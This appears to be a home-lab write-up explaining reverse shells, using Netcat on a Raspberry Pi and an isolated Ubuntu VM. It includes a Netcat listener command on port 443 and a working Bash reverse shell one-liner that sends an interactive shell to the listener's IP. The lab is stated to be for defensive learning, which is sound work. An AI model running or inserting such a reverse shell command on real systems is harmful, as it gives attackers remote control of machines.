<h2>📘 Reverse Shell Lab</h2>

<p>
This project demonstrates how reverse shells work at a fundamental level and why they are commonly used to bypass inbound firewall restrictions. 
By observing outbound connections in an isolated environment, this lab provides a practical foundation for understanding attacker behavior, 
firewall limitations, and early indicators of compromise.
</p>

<hr />

<h2>🎯 Objective</h2>

<ul>
  <li>Understand how reverse shells establish remote access.</li>
  <li>Observe outbound connection behavior in a controlled environment.</li>
  <li>Analyze why firewalls block inbound traffic but allow outbound traffic.</li>
  <li>Build intuition for how attackers leverage this behavior in real-world intrusions.</li>
</ul>

<hr />

<h2>🧪 Lab Environment</h2>

<ul>
  <li><strong>Attacker:</strong> Raspberry Pi running Ubuntu Server</li>
  <li><strong>Target:</strong> Windows host running an Ubuntu VM</li>
  <li><strong>Networking:</strong> VirtualBox Internal Network (isolated)</li>
  <li><strong>Tools:</strong> Netcat (OpenBSD), Bash reverse shell</li>
</ul>

<hr />

<h2>🛠 Tools</h2>

<h3>Netcat (OpenBSD)</h3>
<p>A lightweight networking utility used for reading and writing data across TCP/UDP connections. In this lab, Netcat acts as the listener waiting for the target to connect back.</p>

<h3>Bash Reverse Shell</h3>
<p>A simple Bash one-liner that redirects input/output streams over a TCP connection, enabling remote command execution.</p>

<hr />

<h2>📦 Installing Netcat</h2>

<h3>1. Update package list</h3>
<pre><code>sudo apt update
</code></pre>

<h3>2. Install Netcat</h3>
<pre><code>sudo apt install netcat-openbsd
</code></pre>

<h3>3. Verify installation</h3>
<pre><code>nc -h
</code></pre>

<hr />

<h2>🎧 Setting Up the Listener (Attacker)</h2>

<h3>1. Switch to root</h3>
<pre><code>sudo su -
</code></pre>

<h3>2. Check network interfaces</h3>
<pre><code>ifconfig
</code></pre>

<h3>3. Start Netcat listener on port 443</h3>
<pre><code>nc -l -v -n -p 443
</code></pre>

<p><strong>Parameter breakdown:</strong></p>
<ul>
  <li><strong>-l</strong>: Listen mode</li>
  <li><strong>-v</strong>: Verbose output</li>
  <li><strong>-n</strong>: Disable DNS resolution</li>
  <li><strong>-p</strong>: Specify port</li>
</ul>

<p><strong>Note:</strong> Port 443 is commonly allowed through firewalls, simulating realistic outbound HTTPS traffic.</p>

<hr />

<h2>🖥️ Executing the Reverse Shell (Target VM)</h2>

<p>Run the following command inside the Ubuntu VM:</p>

<pre><code>bash -i >& /dev/tcp/192.168.1.50/443 0>&1
</code></pre>

<p>Replace <code>192.168.1.50</code> with the attacker's actual IP address.</p>

<hr />

<h2>📡 Listener Output</h2>

<p>Once the reverse shell connects, the listener will confirm:</p>

<ul>
  <li>The Pi is listening on port 443</li>
  <li>The VM initiated the outbound connection</li>
  <li>The TCP handshake completed</li>
  <li>Remote command execution is active</li>
</ul>

<hr />

<h2>🔒 Educational Purpose</h2>

<p>
This project is intended solely for defensive security learning in a controlled, isolated environment. 
It helps build intuition for attacker tradecraft, suspicious outbound traffic patterns, and firewall behavior.
</p>
